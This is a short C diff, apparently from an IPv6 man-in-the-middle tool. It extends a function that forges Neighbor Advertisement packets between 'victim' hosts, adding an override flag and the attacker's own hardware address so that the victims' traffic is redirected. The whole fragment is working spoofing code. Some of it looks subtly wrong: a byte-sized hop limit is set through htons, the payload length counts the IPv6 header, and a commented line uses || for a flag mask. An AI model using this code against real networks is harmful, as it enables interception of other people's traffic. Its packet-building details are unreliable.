@@ -184,9 +184,13 @@ char *alloc_ndadvert(struct victim *svic, struct victim *dvic) {
 	struct ip6_hdr *ip6;
 	struct icmp6_hdr *icmp6;
 	struct nd_neighbor_advert *nd;
+	struct nd_opt_hdr *opt;
+	char *hwaddr;
 	char *packet;
 	uint16_t len = sizeof(struct ip6_hdr) +
-					sizeof(struct nd_neighbor_advert);
+					sizeof(struct nd_neighbor_advert) +
+					sizeof(struct nd_opt_hdr) +
+					ETH_ALEN;
 
 	if (!svic || !dvic)
 		return NULL;
@@ -201,14 +205,23 @@ char *alloc_ndadvert(struct victim *svic, struct victim *dvic) {
 	ip6->ip6_src = svic->ipv6;
 	ip6->ip6_plen = htons(len);
 	ip6->ip6_nxt = IPPROTO_ICMPV6;
+	ip6->ip6_hlim = htons(255); //ta ficando 64...
 
 	/* ICMPv6 Header */
 	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
 	icmp6->icmp6_type = ND_NEIGHBOR_ADVERT;
+	//*(icmp6->icmp6_data32) = ND_NA_FLAG_OVERRIDE || ND_NA_FLAG_OVERRIDE;
+	icmp6->icmp6_data8[0] = 0x60;
 
 	/* ND Advertise */
 	nd = (struct nd_neighbor_advert *)icmp6;
 	nd->nd_na_target = dvic->ipv6;
+
+	opt = (struct nd_opt_hdr *)((char *)nd + sizeof(struct nd_neighbor_advert));
+	opt->nd_opt_type = ND_OPT_TARGET_LINKADDR;
+	opt->nd_opt_len = 1;
+	hwaddr = (char *)((char *)opt + sizeof(struct nd_opt_hdr));
+	memcpy(hwaddr, &device.hwaddr, ETH_ALEN);
 
 	icmp6->icmp6_cksum = icmp6_cksum(ip6);
 
